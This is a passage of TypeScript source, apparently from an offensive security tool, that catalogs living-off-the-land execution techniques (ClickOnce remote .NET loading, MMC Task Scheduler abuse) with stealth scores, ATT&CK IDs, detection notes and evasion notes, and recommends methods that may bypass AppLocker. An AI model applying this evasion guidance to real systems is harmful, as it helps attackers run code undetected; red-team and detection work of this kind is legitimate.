        prerequisites: [".NET Framework, ClickOnce deployment infrastructure"],
        detection_notes: "Monitor dfsvc.exe / dfshim.dll execution with remote URLs. Network activity.",
        evasion_notes: "Microsoft-signed deployment framework. Executes .NET assemblies from remote sources.",
      },
      {
        technique: "MMC Task Scheduler Snap-in Abuse",
        description: "Use the Task Scheduler MMC snap-in (taskschd.msc) to create scheduled tasks for execution without using schtasks.exe",
        platform,
        binary: "mmc.exe",
        command: "mmc.exe taskschd.msc",
        payload_type: "msc_builtin",
        stealth_score: 2,
        attck_ids: ["T1218.014", "T1053.005"],
        prerequisites: ["Administrator access for system-level tasks"],
        detection_notes: "MMC loading taskschd.msc is normal admin activity. Monitor new task creation via MMC.",
        evasion_notes: "Normal administrative action. Task creation via GUI may not trigger command-line detection rules.",
      },
    ];

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      const mmcAvailable = session.state.installedBinaries.some(b =>
        b.toLowerCase() === "mmc.exe",
      );

      sessionContext = {
        environment_id: session.id,
        privilege_level: session.state.privilegeLevel,
        mmc_available: mmcAvailable,
        applocker_enabled: session.state.appLockerEnabled,
        recommendations: session.state.appLockerEnabled
          ? "AppLocker detected — MMC-based execution may bypass default application whitelisting rules."
          : "No AppLocker — MMC techniques are viable but proxy execution via other LOLBins may be simpler.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── Export ─────────────────────────────────────────────────────────────────────

export const executionTools: ToolDef[] = [
  exec_proxy,
  exec_compile,
  exec_script_host,
  exec_wmi,
  exec_mmc,
];
